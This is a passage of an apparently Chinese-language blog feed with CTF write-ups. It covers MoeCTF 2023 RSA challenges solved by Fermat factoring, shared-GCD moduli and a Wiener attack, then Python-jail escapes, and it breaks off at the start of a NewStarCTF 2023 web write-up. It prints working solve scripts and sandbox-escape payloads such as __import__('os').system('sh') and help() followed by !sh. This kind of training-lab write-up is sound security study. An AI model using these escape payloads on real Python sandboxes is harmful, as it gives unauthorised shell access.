class="hljs-number">10004937130983861141937782436252502991050957330184611684406783226971057978666503675149401388381995491152372622456604317681236160071166819028679754762162125904637599991943368450200313304999566592294442696755822585022667008378021280392976010576970877334159755332946926433635584313137140987588847077645814987268595739733550220882135750267567373532603503399428451548677091911410732474324157868011686641243202218731844256789044721309478991918322850448456919991540932206923861653518190974620161055008847475600980152660468279765607319838003177639654115075183493029803981527882155542925959658123816315099271123470754815045214896642428657264709805029840253303446203030294879166242867850331945166255924821406218090304893024711068773287842075208409312312188560675094244318565148284432361706108491327014254387317744284876018328591380705408407853404828189643214087638328376675071962141118973835178054884474523241911240926274907256651801384433652425740230755811160476356172444327762497910600719286629420662696949923799255603628210458906831175806791599965316549386396788014703044837917283461862338269599464440202019922379625071512100821922879623930069349084917919100015782270736808388388006084027673781004085620817521378823838335749279055639005125</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>d1 = gmpy2.invert(e,(p1-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>))<br>m1=<span class="hljs-built_in">pow</span>(c1,d1,n1)<br><br>c2 =  <span class="hljs-number">4948422459907576438725352912593232312182623872749480015295307088166392790756090961680588458629287353136729331282506869598853654959933189916541367579979613191505226006688017103736659670745715837820780269669982614187726024837483992949073998289744910800139692315475427811724840888983757813069849711652177078415791290894737059610056340691753379065563574279210755232749774749757141836708161854072798697882671844015773796030086898649043727563289757423417931359190238689436180953442515869613672008678717039516723747808793079592658069533269662834322438864456440701995249381880745586708718334052938634931936240736457181295</span><br>n2 =  <span class="hljs-number">8582505375542551134698364096640878629785534004976071646505285128223700755811329156276289439920192196962008222418309136528180402357612976316670896973298407081310073283979903409463559102445223030866575563539261326076167685019121804961393115251287057504682389257841337573435085535013992761172452417731887700665115563173984357419855481847035192853387338980937451843809282267888616833734087813693242841580644645315837196205981207827105545437201799441352173638172133698491126291396194764373021523547130703629001683366722885529834956411976212381935354905525700646776572036418453784898084635925476199878640087165680193737</span><br><br>n2b=[<span class="hljs-number">9949603102225364603</span>,<span class="hljs-number">10049235158029375571</span>,<span class="hljs-number">10547615587767500213</span>,<span class="hljs-number">10596280721192026229</span>,<span class="hljs-number">10864078180916418691</span>,<span class="hljs-number">11092420583960163379</span>,<span class="hljs-number">11853704782834170959</span>,<span class="hljs-number">12034779627328165471</span>,<span class="hljs-number">12404642343676224637</span>,<span class="hljs-number">12448177342966243757</span>,<span class="hljs-number">13062839684118954553</span>,<span class="hljs-number">13645878578452317313</span>,<span class="hljs-number">14397830993057803133</span>,<span class="hljs-number">14619040595108594017</span>,<span class="hljs-number">14678737767649343977</span>,<span class="hljs-number">14745811312384518031</span>,<span class="hljs-number">14813953870710226847</span>,<span class="hljs-number">15175734709842430433</span>,<span class="hljs-number">15211380502610462057</span>,<span class="hljs-number">15332916111580607077</span>,<span class="hljs-number">15751974537676958401</span>,<span class="hljs-number">16123604149048919099</span>,<span class="hljs-number">16408421615173973083</span>,<span class="hljs-number">16870346804576162551</span>,<span class="hljs-number">17093292308638969889</span>,<span class="hljs-number">17265001711647542137</span>,<span class="hljs-number">17289161209347211817</span>,<span class="hljs-number">17543713628803023199</span>,<span class="hljs-number">17673334943789572513</span>,<span class="hljs-number">18106525049998616747</span>,<span class="hljs-number">18345408081492711641</span>,<span class="hljs-number">18390046459144888243</span>]<br>phi2= <span class="hljs-number">1</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> n2b:<br>    phi2 *= (i-<span class="hljs-number">1</span>)<br>d2=gmpy2.invert(e,phi2)<br>m2=<span class="hljs-built_in">pow</span>(c2,d2,n2)<br><span class="hljs-built_in">print</span>(long_to_bytes(m1)+long_to_bytes(m2))<br></code></pre></td></tr></table></figure><h3 id="p-q"><a href="#p-q" class="headerlink" title="|p-q|"></a>|p-q|</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>e=<span class="hljs-number">65537</span><br>c = <span class="hljs-number">307746143297103281117512771170735061509547958991947416701685589829711285274762039205145422734327595082350457374530975854337055433998982493020603245187129916580627539476324521854057990929173492940833073106540441902619425074887573232779899379436737429823569006431370954961865581168635086246592539153824456681688944066925973182272443586463636373955966146029489121226571408532284480270826510961605206483011204059402338926815599691009406841471142048842308786000059979977645988396524814553253493672729395573658564825709547262230219183672493306100392069182994445509803952976016630731417479238769736432223194249245020320183199001774879893442186017555682902409661647546547835345461056900610391514595370600575845979413984555709077635397717741521573798309855584473259503981955303774208127361309229536010653615696850725905168242705387575720694946072789441481191449772933265705810128547553027708513478130258801233619669699177901566688737559102165508239876805822898509541232565766265491283807922473440397456701500524925191214292669986798631732639221198138026031561329502985577205314190565609214349344303324429408234237832110076900414483795318189628198913032900272406887003325858236057373096880675754802725017537119549989304878960436575670784578550</span><br>n = <span class="hljs-number">329960318345010350458589325571454799968957932130539403944044204698872359769449414256378111233592533561892402020955736786563103586897940757198920737583107357264433730515123570697570757034221232010688796344257587359198400915567115397034901247038275403825404094129637119512164953012131445747740645183682571690806238508035172474685818036517880994658466362305677430221344381425792427288500814551334928982040579744048907401043058567486871621293983772331951723963911377839286050368715384227640638031857101612517441295926821712605955984000617738833973829140899288164786111118033301974794123637285172303688427806450817155786233788027512244397952849209700013205803489334055814513866650854230478124920442832221946442593769555237909177172933634236392800414176981780444770542047378630756636857018730168151824307814244094763132088236333995807013617801783919113541391133267230410179444855465611792191833319172887852945902960736744468250550722314565805440432977225703650102517531531476188269635151281661081058374242768608270563131619806585194608795817118466680430500830137335634289617464844004904410907221482919453859885955054140320857757297655475489972268282336250384384926216818756762307686391740965586168590784252524275489515352125321398406426217</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">factor</span>(<span class="hljs-params">n</span>):<br>    a = gmpy2.iroot(n, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        B2 = <span class="hljs-built_in">pow</span>(a, <span class="hljs-number">2</span>) - n<br>        <span class="hljs-keyword">if</span> gmpy2.is_square(B2):<br>            b = gmpy2.iroot(B2, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>            p = a + b<br>            q = a - b<br>            <span class="hljs-keyword">return</span> p,q<br>        a += <span class="hljs-number">1</span>  <br><br><span class="hljs-comment">#print(factor(n))</span><br>p = <span class="hljs-number">18164809890142267890219276206773099235072154806950582020347085518282960761937147879570277730919110196557742226232054602784278585009762036923951358612733074768279344311938292845187804144458991947979616574535662033512236959010688698879953460760771547964758688700129994322153904156260452550830932232536673055480604083903327472696393017478985867846428177588049472509968031143243583420309569129756696755744088888618703553769561648077215188783123207031628505020478500655602448720006243614258852026797076054766680755124052134730998085155245587457870148748357237005392662882609410088994421984160941612734270140092780661013147</span><br>q = <span class="hljs-number">18164809890142267890219276206773099235072154806950582020347085518282960761937147879570277730919110196557742226232054602784278585009762036923951358612733074768279344311938292845187804144458991947979616574535662033512236959010688698879953460760771547964758688700129994322153904156260452550830932232536673055480604083903327472696393017478985867846428177588049472509968031143243583420309569129756696755744088888618703553769561648077215188783123207031628505020478500655602448720006243614258852026797076054766680755124052134730998085155245587457870148748357237005392662882609410088994421984160941612734270140092780661012811</span><br>d=gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h3 id="rsa-signin"><a href="#rsa-signin" class="headerlink" title="rsa_signin"></a>rsa_signin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">n1 = <span class="hljs-number">17524722204224696445172535263975543817720644608816706978363749891469511686943372362091928951563219068859089058278944528021615923888948698587206920445508493551162845371086030869059282352535451058203615402089133135136481314666971507135484450966505425514285114192275051972496161810571035753943880190780759479521486741046704043699838021850105638224212696697865987677760179564370167062037563913329993433080123575434871852732981112883423565015771421868680113407260917902892944119552200927337996135278491046562185003012971570532979090484837684759828977460570826320870379601193678304983534424368152743368343335213808684523217</span><br>c1 = <span class="hljs-number">6870605439714128574950893771863182370595667973241984289208050776870220326525943524507319708560433091378319367164606150977103661770065561661544375425887970907060665421562712515902428061727268441585629591525591001533188276465911918724808701356962871139957343861919730086334623932624184172272488406793955068827527130338853980609365042071290967556159598511667974987218999253443575482949258292953639729393456515185185102248985930422080581185292420347510600574229080211050520146551505605537486989306457793451086767402197128573781597156939709237045132856159368959981648969874765462190363842275826077556314448408825308218451</span><br>n2 = <span class="hljs-number">24974121071274650888046048586598797033399902532613815354986756278905133499432183463847175542164798764762683121930786715931063152122056911933710481566265603626437742951648885379847799327315791800670175616973945640322985175516271373004547752061826574576722667907302681961850865961386200909397231865804894418194711076667760169256682834206788730947602211228930301853348503098156592000286467190760378847541148772869356389938999094673945092387627113807899212568399028514283219850734634544982646070106811651490010946670117927664594365986238107951837041859682547029079035013475238052160645871718246031144694712586073789250183</span><br>c2 = <span class="hljs-number">10324627733161143472233272675096997859064721978612320424254305978486200326061730105384511258706433940176741256952824288120499229240005823611541292676234913505775165761543820764046537413943393325463602612485849366939102550336256797820440347815027443410399157963547486098366749815425187247171697678576246606105486928212486117878157055321965270364583625270716186820068538749425299073309429589410882809098930213978117176627031795312102177342499674234163614021182116065492884880492891668658240362567156235958605768725892407536211503981819707919444725863397622629226309480836486427388484176463279384813974310500625102568341</span><br>n3 = <span class="hljs-number">14215826065753265334521416948225868542990756976323308408298887797364519400310818641526401662106853573185085731682502059761982246604277475488691297554851873224516934619888327644352138127883043558424300092247604877819821625587944308487310522092440517150600171819145803937177931473336108429889165189521078678397694303305705260759351843006130968234071638035667854938070597400634242396852782331461576526836227336952718230741560369621645218729592233657856104560425642219241082727756696967324334634822771842625681505869025740662258929200756109704988223034840699133778958569054445520305361142302393767439478256174414187983763</span><br>c3 = <span class="hljs-number">415916446053083522663299405080903121619846594209033663622616979372099135281363175464579440520262612010099820951944229484417996994283898028928384268216113118778734726335389504987546718739928112684600918108591759061734340607527889972020273454098314620790710425294297542021830654957828983606433731988998097351888879368160881316237557097381718444193741788664735559392675419489952796677690968481917700683813252460912749931286739585465657312416977086336732056497161860235343155953578618273940135486362350057858779130960380833359506761436212727289297656191243565734621757889931250689354508999144817518599291078968866323093</span><br>n4 = <span class="hljs-number">12221355905532691305226996552124162033756814028292708728711809229588190407700199452617060657420166395065565154239801465361510672853972152857415394695376825120759202857555325904640144375262531345320714166285999668052224661520834318497234299585219832943519644095197479639328120838919035625832361810964127485907587199925564724081163804724975965691571850962714258888527902920462746795712011579424322515292865504642938090200503979483095345893697972170153990274670257331483858538617460680462369680572833191232126527727222302641204529110948993583190295067970240051042000918629138767209918572311469915774910003970381965123241</span><br>c4 = <span class="hljs-number">2248834602646305164283014556051672824689884721514190813323189875541899566338153534858709617544459297836048770439230174669883719627734394673012731609952869246171300132019334542245094425654362711870373095782083791160029789553806741967408922001051006100049326921742208757147339981269528740944842177729701945606827918253016001436218891580980192743564642120923356793292885805519110411357830040053435569937296612987581482128241218218550319154933831743819546558930918761162723110000328532730751591375727881221199739397698390594797621758011191224528339478784930214820615602510460640307707682865125229937141010351138099874025</span><br>n5 = <span class="hljs-number">18152103454920389919231636321286527841833809319334215885641536161086810144890443857211776387914779781628740172079478910188540146498426564211851629962338413488555121865779016981727229209606498886170396500155102635962395243364899026418106378234307821492609778555173516000309435730752571818439328803899462791834490025768785383592935046996428331508608555503567191807692523852530836008436655164751054189301721070209363416058642811329040202582026786024825518381761299547703962502636888833428457116986351812252188468878701301184044948733274488264320930936362549028124581962244201377136969591119942276742760215403738913067567</span><br>c5 = <span class="hljs-number">2797812094994121597295362327809389195134238119144547570610194659000554967367804835006774413888965325870488368112707535584687083342412367127561646136089638402907513075405746055834487062923240856950047936297155455745928810738711368950139327254040579266046642851362228893522740216519732851152162928545416236075387903789535000820423985522550638100049857678600662008021574841083416323980817348573062083159710189689337626277009675683473560325178417766400002763719953723259300977655801234386662217462862844994462505601804422871991694828697337752697234180117437785537788728412520613916334045368736691714704501962513954509705</span><br>n6 = <span class="hljs-number">22877887459293720334652698748191453972019668578065068224653972884599636421200068659750242304040301306798039254241668648594556654589309801728248683586229288074709849246660525799452637187132633064172425677552176203292787732404537215347782229753837476655088638984496409603054524994383358547132112778403912563916886533181616856401929346567686400616307916690806467019665390260267596320840786982457521423178851498130935577260638269429250197050326097193841333205073650802709022947551398142692735680419453533128176592587955634333425401930362881423044363132586170013458300714163531162544301477356808388416864173949089028317961</span><br>c6 = <span class="hljs-number">12271947322974809255127222556723394446467844330408506340843897575503534175121932185624776713618037572593449207329510171212097269297133492090526270770286000839978630002819714376964416081198925899119135271459404333829811516667576167576916805217016117373027245648473458331936273975110163065432285322832123169216976420362833557809289561705091817949915218278430834098156335989014645979633658818904753942786129126233956314517292746008579152368541316795082120147520597254020266752859205131887527661767589367756335766220841483940854397440079467053684289006956034944336788288196391829411432383541473132962783883758561108297747</span><br>n7 = <span class="hljs-number">19844333358004073542783728196775487079202832688982038135532362073659058674903791697765527614270399097276261983744620537925712167578187109058145015032736796457938148615396547198728652435169126585595701228287449135664667959433491335769206692390262797325133960778920452511673878233190120432257482339068405290918739453464061987163074129048150451046315248186376609350095502130018696275764450248681787926130463463923862832714969425813770847493135627599129546112143050369344208092649256659330284904392961574494907186727388685504929586018639846040474616307662546605623294842316524163106100888851228858194942825157286544846177</span><br>c7 = <span class="hljs-number">9531264751315473345056673937611382755236533664089452852716992791452558274873158812669513178040971923528201631609089069182049526587423864397527252061341857426422965190913745048414029690931254119437249218321954899956104589066479231204536856131403590472063496956452030342299863907499976917750846369802185896519725837163530049157920978007252920334447236842959033879772444475877613295594785710745889554296655932909212643500877218304116451889820444820534937901427158918411546484157737612926382420354101675658160847653151539420222526999426483473829341628599881460824765758346670633385844187252696874025582747177333702736465</span><br>n8 = <span class="hljs-number">16956880944655068255446705024149899655327230949463546092744762226005904114738078692036960935391303255804754787864713189658290361949509917704853428701870609882427423574672772606814823959758208695540116440342488334213300943604780971422918744381486937517952553797134323570131582724393100092308466968491068503301604506186521656059375518680612292667310641047190088814753025794048591445267711939066523165042651430468971452726568222388482323097260496415484997546126185688914792795834046855221759289007609518312601640548469651358391745947588643697900883634533872314566389446271647587564348026861264979727062157272541149018781</span><br>c8 = <span class="hljs-number">16110326928338602237561005337578085623028116490564329920738844771341250444164294693848130674347672763073995755532723894042946521372321947507527854966013459795492930736187058535665041545095683801386814190612817128504426590828954205050425979880047802547011117626354405687170961272200066258220699329112978151044633994329352673342582175349200008181837211288847301836681860817044391028992501763375849046751094019224570802498414368189170656992427042010362385494565216988561215657424755648213390551881450141899860811844684546992754530755092358644968088017107313907435586729574798046187046145596726569637758312033849476689378</span><br>n9 = <span class="hljs-number">16472195897077185060734002588086375750797253422014472876266294484788862733424113898147596402056889527985731623940969291811284437034420929030659419753779530635563455664549165618528767491631867637613948406196511848103083967995689432928779805192695209899686072900265108597626632371718430059561807147486376536203800038054012500244392964187780217667805308512187849789773573138494622201856638931435423778275004491853486855300574479177472267767506041000072575623287557610576406578525902565241580838652860552046216587141709709405062150243990097835181557208274750462554811004137033087430556692966525170882625891516050207318491</span><br>c9 = <span class="hljs-number">11867731823522211833301190385669833752050387304375114576570892885641949969365352586215693183003550684262313893105989683214739695968039039944442567581277252581988489020834299896625977474857889570528169919064941042132119301236852358823696947330423679033138054012027878783478922023431469564210485180679933264749281963405243082505688901662659030897104957499953192201440290084373968716271056483463909282407034181891901928790601973222643210525000717355062752079302291729448234374709852429885984987094307177760741403086538949190424454337896501402430653783597070178968921411867485584517214777073301007918941216316241784521708</span><br>n10 = <span class="hljs-number">13890749889361612188368868998653029697326614782260719535555306236512452110708495623964530174188871342332417484996749651846510646453983388637377706674890018646246874688969342600780781646175634455109757266442675502522791531161284420286435654971819525519296719668701529481662071464145515727217108362496784024871976015116522898184301395037566514980846499856316532479656908169681719288258287756566886281183699239684997698487409138330229321935477734921670373632304542254938831218652340699024011371979519574576890581492623709896310465567043899767342676912434857372520308852745792360420376574037705943820090308501053778144141</span><br>c10 = <span class="hljs-number">6250115196713939477947942995075509357173312813431601073354390451609559579925704891503987992181988654989477525811826607070378476102616752398280691012244301950194800995432882828020405062344160270290542566163969692748126314259624623341922057435728127596172871894887055305291345372720594481096374310285437492746765510292863238933163142677773310305789984897974266961231555124787205980411992251387207335655129551950825339766848166539671565212408741432649813058363660321480995187545006718837863674527475323414266732366507905974800565463011676462244368010182725161416783875646259625352308599198614681446394427674340328493047</span><br>n11 = <span class="hljs-number">21457499145521259498911107987303777576783467581104197687610588208126845121702391694574491025398113729462454256070437978257494064504146718372095872819969887408622112906108590961892923178192792218161103488204912792358327748493857104191029765218471874759376809136402361582721860433355338373725980783308091544879562698835405262108188595630215081260699112737457564998798692048522706388318528370551365364702529068656665853097899157141017378975007689790000067275142731212069030175682911154288533716549782283859340452266837760560153014200605378914071410125895494331253564598702942990036163269043699029806343766286247742865671</span><br>c11 = <span class="hljs-number">6269656777204332618433779865483197625538144405832409880710764183039800286008967127279281167109250083159801218370191973055663058165456565194979210256278526713608759141588082614531352489547674696723140599892318118960648862531538435596775798128845789504910467783731144808685373807716609662688064728614003904579841055786083326311313295311152563668422289435606771091246147867715987583149743032723028324394173498623642539175178996531881058274717907066845565199058931743481410454382746158558886667761300257488769795092777021292335562818583719708133179974425584610403335487082478848975656282384575767178925517257692365828720</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>e=<span class="hljs-number">65537</span><br>names = <span class="hljs-built_in">locals</span>()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i+<span class="hljs-number">1</span>,<span class="hljs-number">12</span>):<br>      <span class="hljs-keyword">if</span> GCD(names[<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-built_in">str</span>(i)],names[<span class="hljs-string">&#x27;n&#x27;</span>+<span class="hljs-built_in">str</span>(k)])!=<span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(i,k)<br>p = GCD(n3,n11)<br>q =  n3//p      <br>d=gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m=<span class="hljs-built_in">pow</span>(c3,d,n3)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br>        <br></code></pre></td></tr></table></figure><h3 id="giant-e"><a href="#giant-e" class="headerlink" title="giant_e"></a>giant_e</h3><p>维纳攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">continuedFra</span>(<span class="hljs-params">x, y</span>):<br>    cf = []<br>    <span class="hljs-keyword">while</span> y:<br>        cf.append(x // y)<br>        x, y = y, x % y<br>    <span class="hljs-keyword">return</span> cf<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gradualFra</span>(<span class="hljs-params">cf</span>):<br>    numerator = <span class="hljs-number">0</span><br>    denominator = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cf[::-<span class="hljs-number">1</span>]:<br>        numerator, denominator = denominator, x * denominator + numerator<br>    <span class="hljs-keyword">return</span> numerator, denominator<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_pq</span>(<span class="hljs-params">a, b, c</span>):<br>    par = gmpy2.isqrt(b * b - <span class="hljs-number">4</span> * a * c)<br>    <span class="hljs-keyword">return</span> (-b + par) // (<span class="hljs-number">2</span> * a), (-b - par) // (<span class="hljs-number">2</span> * a)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getGradualFra</span>(<span class="hljs-params">cf</span>):<br>    gf = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(cf) + <span class="hljs-number">1</span>):<br>        gf.append(gradualFra(cf[:i]))<br>    <span class="hljs-keyword">return</span> gf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">wienerAttack</span>(<span class="hljs-params">e, n</span>):<br>    cf = continuedFra(e, n)<br>    gf = getGradualFra(cf)<br>    <span class="hljs-keyword">for</span> d, k <span class="hljs-keyword">in</span> gf:<br>        <span class="hljs-keyword">if</span> k == <span class="hljs-number">0</span>: <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> (e * d - <span class="hljs-number">1</span>) % k != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">continue</span><br>        phi = (e * d - <span class="hljs-number">1</span>) // k<br>        p, q = solve_pq(<span class="hljs-number">1</span>, n - phi + <span class="hljs-number">1</span>, n)<br>        <span class="hljs-keyword">if</span> p * q == n:<br>            <span class="hljs-keyword">return</span> d<br><br>n = <span class="hljs-number">0xbaa70ba4c29eb1e6bb3458827540fce84d40e1c966db73c0a39e4f9f40e975c42e02971dab385be27bd2b0687e2476894845cc46e55d9747a5be5ca9d925931ca82b0489e39724ea814800eb3c0ea40d89ebe7fe377f8d3f431a68d209e7a149851c06a4e67db7c99fcfd9ec19496f29d59bb186feb44a36fe344f11d047b9435a1c47fa2f8ed72f59403ebb0e439738fd550a7684247ab7da64311690f461e6dce03bf2fcd55345948a3b537087f07cd680d7461d326690bf21e39dff30268cb33f86eeceff412cd63a38f7110805d337dcad25e6f7e3728b53ca722b695b0d9db37361b5b63213af50dd69ee8b3cf2085f845d7932c08b27bf638e98497239</span><br>e = <span class="hljs-number">0x609778981bfbb26bb93398cb6d96984616a6ab08ade090c1c0d4fedb00f44f0552a1555efec5cc66e7960b61e94e80e7483b9f906a6c8155a91cdc3e4917fa5347c58a2bc85bb160fcf7fe98e3645cfea8458ea209e565e4eb72ee7cbb232331a862d8a84d91a0ff6d74aa3c779b2b129c3d8148b090c4193234764f2e5d9b2170a9b4859501d07c0601cdd18616a0ab2cf713a7c785fd06f27d68dff24446d884644e08f31bd37ecf48750e4324f959a8d37c5bef25e1580851646d57b3d4f525bc04c7ddafdf146539a84703df2161a0da7a368675f473065d2cb661907d990ba4a8451b15e054bfc4dd73e134f3bf7d8fa4716125d8e21f946d16b7b0fc43</span><br>c = <span class="hljs-number">0x45a9ce4297c8afee693d3cce2525d3399c5251061ddd2462513a57f0fd69bdc74b71b519d3a2c23209d74fcfbcb6b196b5943838c2441cb34496c96e0f9fc9f0f80a2f6d5b49f220cb3e78e36a4a66595aa2dbe3ff6e814d84f07cb5442e2d5d08d08aa9ccde0294b39bfde79a6c6dcd2329e9820744c4deb34a039da7933ddf00b0a0469afb89cba87490a39783a9b2f8f0274f646ca242e78a326dda886c213bc8d03ac1a9150de4ba08c5936c3fe924c8646652ef85aa7ac0103485f472413427a0e9d9a4d416b99e24861ca8499500c693d7a07360158ffffa543480758cafff2a09a9f6628f92767764fa026d48a9dd899838505ae16e38910697f9de14</span><br>d = wienerAttack(e, n)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br></code></pre></td></tr></table></figure><h1 id="pyjail"><a href="#pyjail" class="headerlink" title="pyjail"></a>pyjail</h1><h3 id="Jail-Level-0"><a href="#Jail-Level-0" class="headerlink" title="Jail Level 0"></a>Jail Level 0</h3><p>没有过滤<br><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code>拿到shell<br><img src="/mdimg/moectf2023/53.png"></p><h3 id="Jail-Level-1"><a href="#Jail-Level-1" class="headerlink" title="Jail Level 1"></a>Jail Level 1</h3><p>限制payload 长度12<br><code> breakpoint()</code><br><img src="/mdimg/moectf2023/54.png"></p><h3 id="Jail-Level-2"><a href="#Jail-Level-2" class="headerlink" title="Jail Level 2"></a>Jail Level 2</h3><p>长度 6  <code>help()</code><br>随便输入一个模块 比如 os 然后 !sh 拿到shell<br><img src="/mdimg/moectf2023/55.png"><br><img src="/mdimg/moectf2023/56.png"></p><h3 id="Jail-Level-3"><a href="#Jail-Level-3" class="headerlink" title="Jail Level 3"></a>Jail Level 3</h3><p><img src="/mdimg/moectf2023/57.png"><br><code>ｂreakpoint()</code>用特殊符号b绕过<br>需要在linux nc</p><h3 id="Jail-Level-4"><a href="#Jail-Level-4" class="headerlink" title="Jail Level 4"></a>Jail Level 4</h3><p>py2 <code> eval(input(&#39;&gt;&gt;&gt;&gt;&gt;&#39;))</code><br><img src="/mdimg/moectf2023/58.png"><br>看看源码<br><img src="/mdimg/moectf2023/59.png"></p><h3 id="Leak-Level-0"><a href="#Leak-Level-0" class="headerlink" title="Leak Level 0"></a>Leak Level 0</h3><p><img src="/mdimg/moectf2023/60.png"><br>拿key进后门<br><code> globals()</code><br><img src="/mdimg/moectf2023/61.png"></p><h3 id="Leak-Level-1"><a href="#Leak-Level-1" class="headerlink" title="Leak Level 1"></a>Leak Level 1</h3><p><img src="/mdimg/moectf2023/62.png"><br>长度6<br><code>vars()</code><br><img src="/mdimg/moectf2023/63.png"></p><h3 id="Leak-Level-2"><a href="#Leak-Level-2" class="headerlink" title="Leak Level 2"></a>Leak Level 2</h3><p>help() –》 <code>__mian__</code>拿到key<br><img src="/mdimg/moectf2023/64.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023 week2 wp</title>
    <link href="/2023/10/16/NewStarCTF%202023%20week2/"/>
    <url>/2023/10/16/NewStarCTF%202023%20week2/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p>查看js源码可以看到以下片段</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php">游戏高手<span class="hljs-comment">//游戏结束</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gameover</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;   <br>    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>    xhr.<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span 